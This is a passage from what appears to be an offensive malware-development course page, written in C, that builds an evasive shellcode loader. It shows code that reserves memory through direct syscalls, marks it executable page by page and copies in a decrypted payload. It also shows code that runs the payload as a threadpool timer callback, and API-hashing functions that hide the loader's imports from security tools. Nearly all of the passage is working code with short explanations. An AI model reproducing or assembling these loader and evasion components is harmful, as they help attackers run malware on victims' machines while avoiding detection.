	SIZE_T		sNewPayloadSize		<span class="token operator">=</span> <span class="token function">SET_TO_MULTIPLE_OF_4096</span><span class="token punctuation">(</span>sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">,</span>	<span class="token comment">// rounded up payload size</span>
			    sChunkSize		    <span class="token operator">=</span> PAGE_SIZE<span class="token punctuation">;</span>
	DWORD		ii			        <span class="token operator">=</span> sNewPayloadSize <span class="token operator">/</span> PAGE_SIZE<span class="token punctuation">,</span>			<span class="token comment">// number of iterations needed </span>
			    dwOldPermissions	    <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	PVOID		pAddress		    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    pTmpAddress		    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PBYTE		pTmpPayload		    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// If not initialized</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_Nt<span class="token punctuation">.</span>bInit<span class="token punctuation">)</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>

<span class="token comment">//---------------------------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// ALLOCATE - COMMIT + RW</span>
	<span class="token comment">// This can't be allocated in chunks because there is a risk that the next address to reserve is already reserved for another task</span>
	<span class="token comment">// This will lead NtAllocateVirtualMemory to return 'STATUS_CONFLICTING_ADDRESSES'.</span>
	
	<span class="token comment">// Adding an additional page.</span>
	<span class="token comment">// This page will remain RO and Reserved</span>
	sNewPayloadSize <span class="token operator">=</span> sNewPayloadSize <span class="token operator">+</span> PAGE_SIZE<span class="token punctuation">;</span>

	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtAllocateVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sNewPayloadSize<span class="token punctuation">,</span> MEM_RESERVE<span class="token punctuation">,</span> PAGE_READONLY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Fixing up the base address and size to leave an RO page behind</span>
	sNewPayloadSize <span class="token operator">=</span> sNewPayloadSize <span class="token operator">-</span> PAGE_SIZE<span class="token punctuation">;</span>
	pAddress        <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pAddress <span class="token operator">+</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//---------------------------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// Starting from the base address </span>
	pTmpAddress <span class="token operator">=</span> pAddress<span class="token punctuation">;</span>

	<span class="token comment">// ALLOCATE - COMMIT + RW</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ii<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtAllocateVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sChunkSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pTmpAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pTmpAddress <span class="token operator">+</span> sChunkSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token comment">//---------------------------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// Starting from the base address </span>
	pTmpAddress <span class="token operator">=</span> pAddress<span class="token punctuation">;</span>

	<span class="token comment">// RWX</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ii<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtProtectVirtualMemory<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span><span class="token function">NtCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pTmpAddress<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sChunkSize<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOldPermissions<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		pTmpAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pTmpAddress <span class="token operator">+</span> sChunkSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

<span class="token comment">//---------------------------------------------------------------------------------------------------------------------------------------------</span>

	<span class="token comment">// Starting from the base address </span>
	pTmpAddress <span class="token operator">=</span> pAddress<span class="token punctuation">;</span>
	pTmpPayload <span class="token operator">=</span> pDecryptedPayload<span class="token punctuation">;</span>

	<span class="token comment">// WRITE</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ii<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token function">memcpy</span><span class="token punctuation">(</span>pTmpAddress<span class="token punctuation">,</span> pTmpPayload<span class="token punctuation">,</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

		pTmpPayload <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pTmpPayload <span class="token operator">+</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		pTmpAddress <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pTmpAddress <span class="token operator">+</span> PAGE_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token operator">*</span>pInjectedPayload <span class="token operator">=</span> pAddress<span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-28">Executing Payload</h3>
<p>Following a successful call to the <code>InjectEncryptedPayload</code>
 function, the subsequent step involves executing the injected payload. 
Execution of the payload is achieved through the use of the <a href="https://learn.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-setthreadpooltimer" target="_blank">SetThreadpoolTimer</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-createthreadpooltimer" target="_blank">CreateThreadpoolTimer</a> WinAPI functions.</p>
<p>The <code>CreateThreadpoolTimer</code> function is used to execute 
the payload as a callback function once a timer object has elapsed. The 
timer object is configured by the <code>SetThreadpoolTimer</code> 
function and expires after a specified period of time, for instance, 10 
seconds, as defined by the function. You can find an example of using 
these WinAPIs provided by Microsoft <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/using-the-thread-pool-functions" target="_blank">here</a>.</p>
<p>The following <code>ExecutePayload</code> function leverages the <code>CreateThreadpoolTimer</code> and <code>SetThreadpoolTimer</code> WinAPIs to execute the payload. It accepts a single parameter, <code>pInjectedPayload</code>, representing the address of the injected payload returned by the <code>InjectEncryptedPayload</code> function.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAYLOAD_EXEC_DELAY</span>                  <span class="token expression"><span class="token number">0x0A</span>            </span><span class="token comment">// 10 Seconds delay before executing the payload</span></span>

VOID <span class="token function">ExecutePayload</span><span class="token punctuation">(</span>IN PVOID pInjectedPayload<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	TP_CALLBACK_ENVIRON     tpCallbackEnv   <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	FILETIME                FileDueTime     <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	ULARGE_INTEGER          ulDueTime       <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	PTP_TIMER               ptpTimer        <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pInjectedPayload<span class="token punctuation">)</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>

	<span class="token function">InitializeThreadpoolEnvironment</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tpCallbackEnv<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>ptpTimer <span class="token operator">=</span> <span class="token function">CreateThreadpoolTimer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PTP_TIMER_CALLBACK<span class="token punctuation">)</span>pInjectedPayload<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tpCallbackEnv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>

	<span class="token comment">// Set the timer to fire in PAYLOAD_EXEC_DELAY seconds.</span>
	ulDueTime<span class="token punctuation">.</span>QuadPart              <span class="token operator">=</span> <span class="token punctuation">(</span>ULONGLONG<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span>PAYLOAD_EXEC_DELAY <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	FileDueTime<span class="token punctuation">.</span>dwHighDateTime      <span class="token operator">=</span> ulDueTime<span class="token punctuation">.</span>HighPart<span class="token punctuation">;</span>
	FileDueTime<span class="token punctuation">.</span>dwLowDateTime       <span class="token operator">=</span> ulDueTime<span class="token punctuation">.</span>LowPart<span class="token punctuation">;</span>

	<span class="token function">SetThreadpoolTimer</span><span class="token punctuation">(</span>ptpTimer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FileDueTime<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-29">API Hashing</h3>
<p>The next objective of our loader is to obfuscate the IAT using API hashing. This is achieved through the <code>GetModuleHandleH</code> and <code>GetProcAddressH</code> functions, which replace <code>GetModuleHandleA</code> and <code>GetProcAddress</code>, respectively. Both of these functions were introduced earlier in the course and employ the CRC string hashing algorithm.</p>
<h4 id="toc-heading-30">GetModuleHandleH Function</h4>
<p>The <code>GetModuleHandleH</code> function, as presented below, takes a single parameter, <code>uModuleHash</code>, representing the CRC hash value of the <strong>lowercase ASCII</strong> DLL name. When called, <code>GetModuleHandleH</code> will return the base address of the specified DLL if it is found. Furthermore, if <code>GetModuleHandleH</code>
 is invoked without specifying a hash value, it will return the base 
address of the local executable image. This behavior is analogous to the
 original <code>GetModuleHandle</code> WinAPI.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">HMODULE <span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>IN UINT32 uModuleHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>


	PPEB                    pPeb             <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PPEB_LDR_DATA           pLdr             <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PLDR_DATA_TABLE_ENTRY   pDte             <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pPeb    <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB<span class="token punctuation">)</span><span class="token function">__readgsqword</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pLdr    <span class="token operator">=</span> <span class="token punctuation">(</span>PPEB_LDR_DATA<span class="token punctuation">)</span><span class="token punctuation">(</span>pPeb<span class="token operator">-&gt;</span>LoaderData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pDte    <span class="token operator">=</span> <span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pLdr<span class="token operator">-&gt;</span>InMemoryOrderModuleList<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Return the handle of the local .exe image</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>uModuleHash<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>InInitializationOrderLinks<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer <span class="token operator">&amp;&amp;</span> pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Length <span class="token operator">&lt;</span> MAX_PATH<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			CHAR    cLDllName    <span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span>	  <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
			DWORD   x                          <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

			<span class="token keyword">while</span> <span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

				CHAR	wC	<span class="token operator">=</span> pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>

				<span class="token comment">// Convert to lowercase</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>wC <span class="token operator">&gt;=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> wC <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">)</span>
					cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> wC <span class="token operator">-</span> <span class="token char">'A'</span> <span class="token operator">+</span> <span class="token char">'a'</span><span class="token punctuation">;</span>
				<span class="token comment">// Copy other characters (numbers, special characters ...)</span>
				<span class="token keyword">else</span>
					cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> wC<span class="token punctuation">;</span>

				x<span class="token operator">++</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			cLDllName<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
			
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CRCHASH</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>FullDllName<span class="token punctuation">.</span>Buffer<span class="token punctuation">)</span> <span class="token operator">==</span> uModuleHash <span class="token operator">||</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span>cLDllName<span class="token punctuation">)</span> <span class="token operator">==</span> uModuleHash<span class="token punctuation">)</span> 
				<span class="token keyword">return</span> <span class="token punctuation">(</span>HMODULE<span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token operator">-&gt;</span>InInitializationOrderLinks<span class="token punctuation">.</span>Flink<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Move to the next node in the linked list</span>
		pDte <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>PLDR_DATA_TABLE_ENTRY<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pDte<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span> 

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-31">GetProcAddressH Function</h4>
<p>The <code>GetProcAddressH</code> function, shown below, requires two parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the DLL module that holds the address of the desired WinAPI.</p>
</li>
<li>
<p><code>uApiHash</code> - The CRC hash value corresponding to the WinAPI's name.</p>
</li>
</ul>
<p>This <code>GetProcAddressH</code> function contains forwarded functions support which was discussed in the <em>Forwarded Functions</em> challenge.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">FARPROC <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span>IN HMODULE hModule<span class="token punctuation">,</span> IN UINT32 uApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PBYTE                           pBase                     <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>hModule<span class="token punctuation">;</span>
	PIMAGE_NT_HEADERS               pImgNtHdrs                <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PIMAGE_EXPORT_DIRECTORY         pImgExportDir             <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                          pdwFunctionNameArray      <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PDWORD                          pdwFunctionAddressArray   <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	PWORD                           pwFunctionOrdinalArray    <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	DWORD                           dwImgExportDirSize        <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hModule <span class="token operator">||</span> <span class="token operator">!</span>uApiHash<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pImgNtHdrs <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_NT_HEADERS<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>PIMAGE_DOS_HEADER<span class="token punctuation">)</span>pBase<span class="token punctuation">)</span><span class="token operator">-&gt;</span>e_lfanew<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pImgNtHdrs<span class="token operator">-&gt;</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	pImgExportDir           <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_EXPORT_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>VirtualAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
	dwImgExportDirSize      <span class="token operator">=</span> pImgNtHdrs<span class="token operator">-&gt;</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_EXPORT<span class="token punctuation">]</span><span class="token punctuation">.</span>Size<span class="token punctuation">;</span>
	pdwFunctionNameArray    <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNames<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pdwFunctionAddressArray <span class="token operator">=</span> <span class="token punctuation">(</span>PDWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfFunctions<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pwFunctionOrdinalArray  <span class="token operator">=</span> <span class="token punctuation">(</span>PWORD<span class="token punctuation">)</span> <span class="token punctuation">(</span>pBase <span class="token operator">+</span> pImgExportDir<span class="token operator">-&gt;</span>AddressOfNameOrdinals<span class="token punctuation">)</span><span class="token punctuation">;</span>


	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pImgExportDir<span class="token operator">-&gt;</span>NumberOfFunctions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	
		CHAR<span class="token operator">*</span>	pFunctionName           <span class="token operator">=</span> <span class="token punctuation">(</span>CHAR<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionNameArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		PVOID	pFunctionAddress        <span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBase <span class="token operator">+</span> pdwFunctionAddressArray<span class="token punctuation">[</span>pwFunctionOrdinalArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CRCHASH</span><span class="token punctuation">(</span>pFunctionName<span class="token punctuation">)</span> <span class="token operator">==</span> uApiHash<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			
			<span class="token comment">// Forwarded functions support:</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pImgExportDir<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
				<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pImgExportDir<span class="token punctuation">)</span> <span class="token operator">+</span> dwImgExportDirSize<span class="token punctuation">)</span>
				<span class="token punctuation">)</span> <span class="token punctuation">{</span>

				CHAR	cForwarderName	<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span>	 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
				DWORD	dwDotOffset			         <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
				PCHAR	pcFunctionMod			     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
				PCHAR	pcFunctionName			     <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

				<span class="token function">memcpy</span><span class="token punctuation">(</span>cForwarderName<span class="token punctuation">,</span> pFunctionAddress<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>cForwarderName<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PCHAR<span class="token punctuation">)</span>cForwarderName<span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
						dwDotOffset <span class="token operator">=</span> i<span class="token punctuation">;</span>			   
						cForwarderName<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> 
						<span class="token keyword">break</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>

				pcFunctionMod	<span class="token operator">=</span> cForwarderName<span class="token punctuation">;</span>
				pcFunctionName	<span class="token operator">=</span> cForwarderName <span class="token operator">+</span> dwDotOffset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>

				fnLoadLibraryA pLoadLibraryA <span class="token operator">=</span> <span class="token punctuation">(</span>fnLoadLibraryA<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> LoadLibraryA_CRC32<span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span>pLoadLibraryA<span class="token punctuation">)</span>
					<span class="token keyword">return</span> <span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">pLoadLibraryA</span><span class="token punctuation">(</span>pcFunctionMod<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">CRCHASH</span><span class="token punctuation">(</span>pcFunctionName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">return</span> <span class="token punctuation">(</span>FARPROC<span class="token punctuation">)</span>pFunctionAddress<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
